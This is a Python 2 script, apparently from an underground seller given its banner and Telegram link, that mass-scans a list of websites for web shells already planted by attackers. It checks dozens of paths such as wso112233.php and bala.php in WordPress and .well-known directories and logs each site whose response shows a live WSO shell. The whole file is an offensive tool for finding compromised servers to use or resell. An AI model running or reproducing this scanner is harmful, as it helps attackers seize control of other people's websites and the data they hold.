import sys , requests, re, random, string
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init 
init(autoreset=True)
fr  =   Fore.RED
fg  =   Fore.GREEN

banner = '''{}
		   
[#] Create By ::
	  ___                                                    ______        
>=>      >=>           >======>         >===>          >===>      >===>>=====> 
 >=>   >=>   >====>>=> >=>    >=>     >=>    >=>     >=>    >=>        >=>     
  >=> >=>         >=>  >=>    >=>   >=>        >=> >=>        >=>      >=>     
    >=>          >=>   >> >==>      >=>        >=> >=>        >=>      >=>     
  >=> >=>       >=>    >=>  >=>     >=>        >=> >=>        >=>      >=>     
 >=>   >=>      >=>    >=>    >=>     >=>     >=>    >=>     >=>       >=>     
>=>      >=>    >=>    >=>      >=>     >===>          >===>           >=>     
          ############## perv exploit joomla ##############                                                                     		 
	    Telegram Channels => https://t.me/x7seller					   
\n'''.format(fr)
print banner
requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def ran(length):
	letters = string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(length))

Pathlist = ['/.well-known/wso112233.php','/wso112233.php','/.well-knownold/wso112233.php','/.well-known/acme-challenge/wso112233.php','/.well-known/pkivalidation/wso112233.php','/wp-content/plugins/wso112233.php','/wp-content/uploads/wso112233.php','/wp-content/wso112233.php','/wp-includes/wso112233.php','/wp-admin/wso112233.php','/wp-content/themes/wso112233.php','/.well-known/shell20211028.php','/shell20211028.php','/.well-knownold/shell20211028.php','/.well-known/acme-challenge/shell20211028.php','/.well-known/pkivalidation/shell20211028.php','/wp-content/plugins/shell20211028.php','/wp-content/uploads/shell20211028.php','/wp-content/shell20211028.php','/wp-includes/shell20211028.php','/wp-admin/shell20211028.php','/wp-content/themes/shell20211028.php','/.well-known/bala.php','/bala.php','/.well-knownold/bala.php','/.well-known/acme-challenge/bala.php','/.well-known/pkivalidation/bala.php','/wp-content/plugins/bala.php','/wp-content/uploads/bala.php','/wp-content/bala.php','/wp-includes/bala.php','/wp-admin/bala.php','/wp-content/themes/bala.php','/dropdown.php','/wp-content/dropdown.php','/wp-includes/dropdown.php','/wp-admin/dropdown.php']

class EvaiLCode:
	def __init__(self):

		self.headers = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'}

	
	def URLdomain(self, site):

		if site.startswith("http://") :
			site = site.replace("http://","")
		elif site.startswith("https://") :
			site = site.replace("https://","")
		else :
			pass
		pattern = re.compile('(.*)/')
		while re.findall(pattern,site):
			sitez = re.findall(pattern,site)
			site = sitez[0]
		return site
		
		
	def checker(self, site):
		try:
			
			url = "http://" + self.URLdomain(site)
			for Path in Pathlist:
				check = requests.get(url + Path, headers=self.headers, verify=False, timeout=25).content
				if("Uname:" in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('wso-shell.txt','a').write(url + Path + "\n")
					break
				else:
					print('Target:{} -->! {}[Failid]').format(url, fr)
					
		except:
			pass



	
Control = EvaiLCode()	
def RunUploader(site):
	try:
		Control.checker(site)
	except:
		pass
mp = Pool(100)
mp.map(RunUploader, target)
mp.close()
mp.join()